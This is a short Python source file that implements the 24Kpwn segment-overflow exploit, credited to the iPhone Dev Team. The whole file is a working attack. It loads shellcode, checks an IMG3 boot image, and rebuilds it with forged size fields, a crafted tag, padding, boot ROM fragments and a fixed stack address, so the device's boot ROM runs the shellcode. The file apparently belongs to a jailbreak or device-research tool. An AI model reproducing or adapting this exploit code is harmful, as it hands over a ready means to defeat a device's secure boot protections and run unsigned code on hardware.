# Credit: This file is based on 24Kpwn exploit (segment overflow) by the iPhone Dev Team.

import struct

def exploit(img3, securerom):
    with open('bin/24Kpwn-shellcode.bin', 'rb') as f:
        shellcode = f.read()
    MAX_SHELLCODE_LENGTH = 1024
    assert len(shellcode) <= MAX_SHELLCODE_LENGTH

    SHELLCODE_ADDRESS = 0x84024000 + 1 - 24 - 4 - len(shellcode)
    payload = shellcode + struct.pack('<I4s2I4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)

    # Check IMG3 constraints.
    (img3_magic, total_size, data_size, signed_size, magic) = struct.unpack('<4s3I4s', img3[:20])
    assert img3_magic == 'Img3'[::-1] and magic == 'illb'[::-1]
    assert total_size < 0x24000 - len(payload) - 12
    assert data_size < 0x24000 - len(payload) - 12 - 20
    assert signed_size < 0x24000 - len(payload) - 12 - 20 and signed_size != 0
    assert len(img3) >= 20 + signed_size + 4 and img3[20 + signed_size:20 + signed_size + 4] == 'SHSH'[::-1]

    img3 = struct.pack('<4s3I', 'Img3'[::-1], 0x24200, 0x241BC, 0x23FD4) + img3[16:20 + signed_size]
    img3 += struct.pack('4s2I', '24KP'[::-1], 0x24000 - 24 - signed_size - 20, 0)

    STACK_ADDRESS = 0x84033E98
    PADDING_BEFORE = 0x24000 - len(payload) - len(img3)
    return img3 + '\x00' * PADDING_BEFORE + payload + securerom[0xb000:0xb1cc] + struct.pack('<I', STACK_ADDRESS) + '\x00' * 0x30
